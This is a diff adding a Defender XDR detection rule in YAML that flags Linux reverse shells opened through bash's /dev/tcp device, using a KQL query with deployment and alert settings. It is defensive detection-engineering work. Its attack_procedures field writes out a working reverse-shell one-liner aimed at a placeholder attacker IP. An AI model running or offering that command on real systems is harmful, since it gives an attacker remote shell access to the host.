@@ -1,0 +1,82 @@
+# yaml-language-server: $schema=https://detectionflow.com/schemas/udlf/v0.3.2.json
+#
+# Showcase: a Defender XDR custom detection. One KQL (Kusto, advanced-hunting
+# schema) variant deployed through Microsoft Graph. Exercises the
+# defender-xdr v0.1.0 config: a near-real-time schedule, an alert title with a
+# `{{Column}}` token, custom details, and entity mappings. The account is
+# mapped by name plus NT domain, because Graph refuses a name alone.
+id: 3f9a1c2e-7b4d-4e8a-9c6f-2d1e0b7a5c43
+title: Linux Reverse Shell via /dev/tcp
+lifecycle: live
+
+metadata:
+  created_at: "2026-10-27"
+  version: "1.0.0"
+  authors:
+    - Detection Engineering Team
+
+detection_context:
+  severity: high
+  description: |
+    Detects a shell on a Linux server redirecting its input and output to a
+    network socket through bash's /dev/tcp pseudo-device.
+  false_positives: |
+    Health-check scripts that probe a port with /dev/tcp. They connect and exit
+    without redirecting an interactive shell.
+  implementation_guidance: |
+    Requires Linux servers onboarded to Defender for Endpoint, so that
+    DeviceProcessEvents is populated for them.
+  investigation_guidance: |
+    Identify the remote endpoint in the command line, the parent process and the
+    owning account, then review the host's network connections at that time.
+  attack_procedures: |
+    bash -i >& /dev/tcp/203.0.113.10/4444 0>&1
+  references:
+    - https://attack.mitre.org/techniques/T1059/004/
+
+threat:
+  attack_version: "19"
+  attack:
+    - technique: T1059.004
+      tactics:
+        - Execution
+
+# A single KQL variant. It keeps every source column, so Timestamp, DeviceId,
+# ReportId and the account columns the entities name all reach the result.
+detection_content:
+  - language: kql
+    description: Defender advanced hunting query
+    logic: |
+      DeviceProcessEvents
+      | where FileName in~ ("bash", "sh", "dash", "zsh")
+      | where ProcessCommandLine contains "/dev/tcp/"
+
+deployments:
+  - name: defender-prod
+    platform: defender-xdr           # discriminator: selects the kql variant + scopes config
+    lifecycle: live
+    # Free-form to the UDLF core schema; optionally checked against
+    # schemas/udlf/config/defender-xdr/v0.1.0.json as a separate, explicit pass.
+    config:
+      schema: defender-xdr::0.1.0
+      schedule:
+        nrt: true                    # one table, no joins or comments, so it can run continuously
+      alert:
+        title: Reverse shell from {{DeviceName}}
+        recommended_actions: Confirm the remote endpoint and the owning account; isolate the host if the connection is unexplained.
+        custom_details:
+          CommandLine: ProcessCommandLine
+          Parent: InitiatingProcessFileName
+      entities:
+        hosts:
+          - device_id_column: DeviceId
+            name_column: DeviceName
+        accounts:
+          - name_column: AccountName
+            nt_domain_column: AccountDomain   # on Linux this is usually the host name
+
+changelog:
+  - date: "2026-10-27"
+    version: "1.0.0"
+    author: Detection Engineering Team
+    summary: Initial KQL reverse-shell detection with a Defender XDR custom-detection deployment.
